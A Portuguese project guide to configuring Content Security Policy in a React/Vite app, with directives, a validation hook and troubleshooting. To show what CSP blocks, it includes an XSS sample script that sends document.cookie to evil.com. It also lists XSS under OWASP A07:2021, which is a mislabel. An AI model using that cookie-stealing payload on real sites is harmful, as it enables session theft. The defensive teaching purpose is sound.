# 🛡️ CSP Guide - Content Security Policy

**FASE 6: Proteção contra XSS e Injection Attacks**

---

## 📋 Índice

1. [O que é CSP?](#o-que-é-csp)
2. [Como Funciona](#como-funciona)
3. [Diretivas Implementadas](#diretivas-implementadas)
4. [Uso em React](#uso-em-react)
5. [Configuração](#configuração)
6. [Exemplos Práticos](#exemplos-práticos)
7. [Troubleshooting](#troubleshooting)

---

## 🎯 O que é CSP?

**Content Security Policy (CSP)** é um mecanismo de segurança que previne:

- ✅ **XSS (Cross-Site Scripting)**
- ✅ **Data Injection Attacks**
- ✅ **Clickjacking**
- ✅ **Code Injection**
- ✅ **Mixed Content**

CSP funciona definindo de onde recursos (scripts, estilos, imagens, etc.) podem ser carregados.

**OWASP Mapping:**
- A03:2021 (Injection) - ✅ Mitigado
- A05:2021 (Security Misconfiguration) - ✅ Resolvido

---

## 🔧 Como Funciona

CSP usa **diretivas** que especificam fontes permitidas:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

### Exemplo de Bloqueio

**SEM CSP:**
```html
<!-- Script malicioso injetado via XSS -->
<script>
  fetch('https://evil.com/steal?data=' + document.cookie);
</script>
```
✅ **EXECUTADO** (cookies roubados!)

**COM CSP:**
```
script-src 'self'
```
❌ **BLOQUEADO** (não é do mesmo domínio)

---

## 📝 Diretivas Implementadas

### Produção (Restritiva)

```javascript
{
  'default-src': ["'self'"],           // Padrão: apenas próprio domínio
  'script-src': ["'self'"],             // Scripts apenas do domínio
  'style-src': ["'self'", "'unsafe-inline'", 'fonts.googleapis.com'],
  'img-src': ["'self'", 'data:', 'https:'],  // Imagens de qualquer HTTPS
  'font-src': ["'self'", 'data:', 'fonts.gstatic.com'],
  'connect-src': ["'self'", ...allowedDomains],  // APIs permitidas
  'media-src': ["'self'", ...allowedDomains],    // Áudio/vídeo
  'object-src': ["'none'"],             // Bloqueia <object>, <embed>
  'frame-src': ["'none'"],              // Bloqueia iframes
  'base-uri': ["'self'"],               // Previne base tag hijacking
  'form-action': ["'self'"],            // Forms só pro próprio domínio
  'frame-ancestors': ["'none'"],        // Previne clickjacking
  'upgrade-insecure-requests': true,    // Força HTTPS
  'block-all-mixed-content': true       // Bloqueia HTTP em HTTPS
}
```

### Desenvolvimento (Permissiva)

Adiciona:
- `'unsafe-eval'` para HMR do Vite
- `ws:`, `wss:` para WebSockets
- `http:` para recursos locais

---

## 💻 Uso em React

### 1. Hook useCSP

```tsx
import { useCSP } from '@/hooks/useCSP';

function MyComponent() {
  const { isUrlAllowed, validateUrl } = useCSP();

  const handleExternalLink = (url: string) => {
    // Verifica se URL é permitida
    if (isUrlAllowed(url, 'media')) {
      window.open(url);
    } else {
      alert('URL bloqueada pela política de segurança');
    }
  };

  // Validação com detalhes
  const result = validateUrl('https://example.com/audio.mp3', 'media');
  if (!result.isValid) {
    console.error(result.error);
  }
}
```

### 2. Validação de URLs Externas

```tsx
import { useCSP } from '@/hooks/useCSP';

function AudioPlayer({ url }: { url: string }) {
  const { validateUrl } = useCSP();
  const validation = validateUrl(url, 'media');

  if (!validation.isValid) {
    return <div className="error">{validation.error}</div>;
  }

  return <audio src={url} controls />;
}
```

### 3. Debugging CSP

```tsx
import { useCSP } from '@/hooks/useCSP';

function CSPDebugger() {
  const { getCurrentCSP } = useCSP();

  useEffect(() => {
    console.log('CSP Atual:', getCurrentCSP());
  }, []);
}
```

---

## ⚙️ Configuração

### 1. Domínios Permitidos

**`.env`:**
```bash
VITE_CSP_DOMAINS=https://stream.zeno.fm,https://actions.google.com
```

**`security.config.ts`:**
```typescript
export const securityConfig = {
  csp: {
    allowedDomains: getArrayEnv('VITE_CSP_DOMAINS', [
      'https://stream.zeno.fm',
      'https://actions.google.com'
    ])
  }
};
```

### 2. Adicionar Novo Domínio

**Passo 1:** Adicione ao `.env`:
```bash
VITE_CSP_DOMAINS=https://stream.zeno.fm,https://actions.google.com,https://novo-dominio.com
```

**Passo 2:** Reinicie o servidor:
```bash
npm run dev
```

### 3. Desabilitar CSP (NÃO RECOMENDADO)

Apenas para debugging. **NUNCA em produção!**

```typescript
// csp.service.ts
generateCSP(): string {
  return "default-src *"; // ⚠️ INSEGURO!
}
```

---

## 📚 Exemplos Práticos

### Exemplo 1: Stream de Música

```tsx
import { useCSP } from '@/hooks/useCSP';

function MusicPlayer() {
  const { isUrlAllowed } = useCSP();
  const streamUrl = 'https://stream.zeno.fm/lofi';

  // Verifica se domínio está permitido
  if (!isUrlAllowed(streamUrl, 'media')) {
    return <div>❌ Stream bloqueado pela CSP</div>;
  }

  return (
    <audio src={streamUrl} controls>
      🎵 Lo-fi Stream
    </audio>
  );
}
```

### Exemplo 2: Imagem Externa

```tsx
function ExternalImage({ url }: { url: string }) {
  const { validateUrl } = useCSP();
  const result = validateUrl(url, 'img');

  if (!result.isValid) {
    return (
      <div className="text-red-500">
        🚫 {result.error}
      </div>
    );
  }

  return <img src={url} alt="External" />;
}
```

### Exemplo 3: API Externa

```tsx
function FetchExternalData() {
  const { isUrlAllowed } = useCSP();
  const apiUrl = 'https://api.example.com/data';

  const fetchData = async () => {
    if (!isUrlAllowed(apiUrl, 'connect')) {
      throw new Error('API bloqueada pela CSP');
    }

    const response = await fetch(apiUrl);
    return response.json();
  };
}
```

---

## 🐛 Troubleshooting

### Erro: "Refused to load the script"

**Causa:** Script de domínio não permitido

**Solução:**
1. Verifique o console do navegador para ver qual URL foi bloqueada
2. Adicione o domínio ao `VITE_CSP_DOMAINS`
3. Se for script inline, considere usar hash ou nonce

**Exemplo:**
```
Refused to load the script 'https://cdn.example.com/script.js'
because it violates the following Content Security Policy directive: "script-src 'self'"
```

Adicione ao `.env`:
```bash
VITE_CSP_DOMAINS=https://cdn.example.com
```

### Erro: "Refused to execute inline script"

**Causa:** `'unsafe-inline'` não está permitido

**Soluções:**

1. **Extrair para arquivo separado (RECOMENDADO):**
```tsx
// ❌ Inline (bloqueado)
<div onClick={() => alert('Hi')}>Click</div>

// ✅ Externo (permitido)
function handleClick() {
  alert('Hi');
}
<div onClick={handleClick}>Click</div>
```

2. **Usar nonce (avançado):**
```html
<!-- Backend gera nonce único -->
<script nonce="random123">
  console.log('Allowed');
</script>
```

### Erro: "Mixed content blocked"

**Causa:** HTTP em página HTTPS

**Solução:** Use HTTPS:
```tsx
// ❌ HTTP (bloqueado)
<img src="http://example.com/image.jpg" />

// ✅ HTTPS (permitido)
<img src="https://example.com/image.jpg" />
```

### Erro: "Refused to frame"

**Causa:** `frame-src 'none'` ou `frame-ancestors 'none'`

**Solução (se realmente necessário):**
```typescript
// csp.service.ts
'frame-src': ['https://trusted-iframe.com']
```

### Console mostra violações CSP

**Causa:** CSP reporting funcionando

**Ver detalhes:**
```typescript
// App.tsx já inicializa reporting
cspService.setupCSPReporting();

// Violações aparecem no console automaticamente
```

---

## 🔍 Verificação de CSP

### Via Console

```javascript
// No DevTools console
console.log(document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content);
```

### Via Lighthouse

1. Abra DevTools (F12)
2. Tab "Lighthouse"
3. Run audit
4. Verifique "Best Practices" > "Content Security Policy"

### Via CSP Evaluator

1. Acesse: https://csp-evaluator.withgoogle.com/
2. Cole sua CSP
3. Analise warnings e sugestões

---

## 📊 CSP e OWASP

| OWASP Top 10 | CSP Mitiga? | Como |
|-------------|------------|------|
| A03:2021 Injection | ✅ SIM | Bloqueia scripts maliciosos injetados |
| A05:2021 Security Misconfiguration | ✅ SIM | Configura políticas seguras |
| A07:2021 XSS | ✅ SIM | Previne execução de scripts não autorizados |

---

## 📚 Recursos Adicionais

- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP: Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Can I use CSP?](https://caniuse.com/contentsecuritypolicy)

---

## 🚀 Próximos Passos

Após CSP implementado:

1. ✅ **FASE 6:** CSP implementado
2. ⏭️ **FASE 7:** Rate limiting e proteção brute force
3. ⏭️ **FASE 8:** CORS e headers de segurança
4. ⏭️ **FASE 9:** Testes de segurança e documentação final

---

**🔒 Mantenha sua aplicação segura!**

Para dúvidas ou problemas, consulte o [SECURITY_CHECKLIST.md](./SECURITY_CHECKLIST.md)
